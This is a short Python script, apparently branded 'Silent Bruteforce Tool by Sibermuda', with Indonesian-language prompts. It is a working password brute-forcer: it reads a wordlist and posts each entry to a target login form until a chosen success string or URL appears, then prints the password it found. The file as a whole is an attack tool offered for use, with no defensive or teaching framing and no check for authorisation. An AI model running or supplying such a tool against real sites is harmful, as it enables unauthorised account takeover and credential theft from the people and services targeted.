import requests
import os

# Warna
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
RESET = "\033[0m"

# Banner
banner = f"""{GREEN}
██████╗ ██████╗ ██╗   ██╗████████╗███████╗██████╗ 
██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝██╔══██╗
██████╔╝██████╔╝██║   ██║   ██║   █████╗  ██████╔╝
██╔═══╝ ██╔══██╗██║   ██║   ██║   ██╔══╝  ██╔══██╗
██║     ██║  ██║╚██████╔╝   ██║   ███████╗██║  ██║
╚═╝     ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝╚═╝  ╚═╝
{YELLOW}Silent Bruteforce Tool by Sibermuda{RESET}
"""

def bruteforce_login_silent(login_url, username, password_file, user_field, pass_field, success_indicator):
    session = requests.Session()
    try:
        with open(password_file, "r", encoding="utf-8") as file:
            for password in file:
                password = password.strip()
                data = {
                    user_field: username,
                    pass_field: password
                }

                response = session.post(login_url, data=data, allow_redirects=True)

                if success_indicator in response.text or success_indicator in response.url:
                    print(f"\n{GREEN}[✔] Login BERHASIL!{RESET}")
                    print(f"{GREEN}Username: {username}{RESET}")
                    print(f"{GREEN}Password: {password}{RESET}")
                    return password
    except FileNotFoundError:
        print(f"{RED}[!] File password tidak ditemukan!{RESET}")
    except Exception as e:
        print(f"{RED}[!] Error: {e}{RESET}")

    print(f"\n{RED}[!] Tidak ada password yang cocok.{RESET}")
    return None

# Main
if __name__ == "__main__":
    os.system("clear" if os.name == "posix" else "cls")
    print(banner)

    login_url = input(f"{YELLOW}Masukkan URL login target: {RESET}")
    username = input(f"{YELLOW}Masukkan username target: {RESET}")
    password_file = input(f"{YELLOW}Masukkan path file password list: {RESET}")
    user_field = input(f"{YELLOW}Field username (cth: log / username): {RESET}")
    pass_field = input(f"{YELLOW}Field password (cth: pwd / password): {RESET}")
    success_indicator = input(f"{YELLOW}Indikator sukses (URL/teks): {RESET}")

    print(f"\n{YELLOW}[•] Sedang mencoba login, mohon tunggu...{RESET}")
    bruteforce_login_silent(login_url, username, password_file, user_field, pass_field, success_indicator)
